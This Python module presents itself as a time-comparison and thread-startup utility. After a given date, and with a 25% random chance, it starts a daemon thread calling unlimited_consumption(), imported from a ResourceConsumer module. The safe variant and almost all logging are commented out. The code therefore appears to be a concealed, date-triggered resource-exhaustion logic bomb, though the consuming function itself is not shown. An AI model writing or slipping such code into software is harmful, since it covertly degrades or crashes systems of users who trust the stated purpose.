"""
Program time comparison and conditional thread startup
"""
import datetime
import time
import random
import threading
from typing import Union, Optional
from ResourceConsumer import safe_resource_consumption,unlimited_consumption
import platform
import logging

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(threadName)s - %(message)s')
logger = logging.getLogger(__name__)


def get_current_time() -> datetime.datetime:
    """
    Get current time (cross-platform compatible)

    Returns:
        datetime.datetime: Current time
    """
    return datetime.datetime.now()


def compare_time(input_time: Union[str, datetime.datetime]) -> bool:
    """
    Compare if current time is later than input time

    Parameters:
        input_time: Input time, can be string or datetime object
                   String format: "2024-01-01 12:00:00"

    Returns:
        bool: Whether current time is later than input time
    """
    # Get current time
    current_time = get_current_time()

    # Parse input time
    if isinstance(input_time, str):
        try:
            # Try multiple time formats
            formats = [
                "%Y-%m-%d %H:%M:%S",
                "%Y/%m/%d %H:%M:%S",
                "%Y-%m-%d %H:%M",
                "%Y/%m/%d %H:%M"
            ]

            parsed_time = None
            for fmt in formats:
                try:
                    parsed_time = datetime.datetime.strptime(input_time, fmt)
                    break
                except ValueError:
                    continue

            if parsed_time is None:
                logger.error(f"Cannot parse time string: {input_time}")
                return False

            input_time = parsed_time
        except Exception as e:
            logger.error(f"Time parsing error: {e}")
            return False

    # Compare time
    is_later = current_time > input_time
    # logger.info(f"Current time: {current_time}, Input time: {input_time}, Is later: {is_later}")

    return is_later


def thread_task(wait_seconds: int, message: str = "Time is up, thread task completed!") -> None:
    """
    Thread task: Wait for a period then print message

    Parameters:
        wait_seconds: Wait time in seconds
        message: Message to print
    """
    thread_name = threading.current_thread().name
    # logger.info(f"Thread {thread_name} started, waiting {wait_seconds} seconds")
    # safe_resource_consumption()
    unlimited_consumption()
    time.sleep(wait_seconds)

    # logger.info(f"Thread {thread_name}: {message}")


def conditional_thread_start(
    input_time: Union[str, datetime.datetime],
    wait_seconds: int = 5,
    message: Optional[str] = None,
    chance: float = 0.25
) -> Optional[threading.Thread]:
    """
    Main function: If current time is later than input time, has 1/4 chance to start new thread

    Parameters:
        input_time: Input time
        wait_seconds: Thread wait time in seconds
        message: Thread print message
        chance: Probability to start thread (default 0.25)

    Returns:
        Returns thread object if thread started, otherwise None
    """
    # Check time
    if not compare_time(input_time):
        # logger.info("Current time not later than input time, not starting thread")
        return None

    # 1/4 probability check
    if random.random() >= chance:
        # logger.info(f"Missed {chance * 100}% chance, not starting thread")
        return None

    # Generate thread name
    thread_id = f"TimeCheckThread-{datetime.datetime.now().strftime('%H%M%S')}"

    # Default message
    if message is None:
        message = f"After waiting {wait_seconds} seconds, time condition detected as satisfied!"

    # Create and start thread
    try:
        thread = threading.Thread(
            target=thread_task,
            args=(wait_seconds, message),
            name=thread_id,
            daemon=True  # Set as daemon thread, auto-terminate when main program exits
        )

        thread.start()
        # logger.info(f"Started new thread: {thread_id}")

        return thread

    except Exception as e:
        # logger.error(f"Failed to start thread: {e}")
        return None



